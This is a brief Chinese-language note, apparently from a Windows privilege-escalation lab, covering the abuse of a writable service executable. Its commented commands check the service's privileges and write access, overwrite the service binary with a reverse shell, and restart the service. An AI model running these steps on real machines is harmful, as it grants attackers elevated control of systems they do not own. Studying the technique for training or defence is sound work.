# 不安全的服务中的可执行文件

## 案例：filepermsvc

```bash
sc qc filepermsvc  //查看服务以何种权限运行
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"  //查看用户权限是否具有可写
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y   //将反向shell 复制到该特定文件夹，并覆盖具有相同服务可执行文件名称的文件
net start filepermsvc //重启服务
```
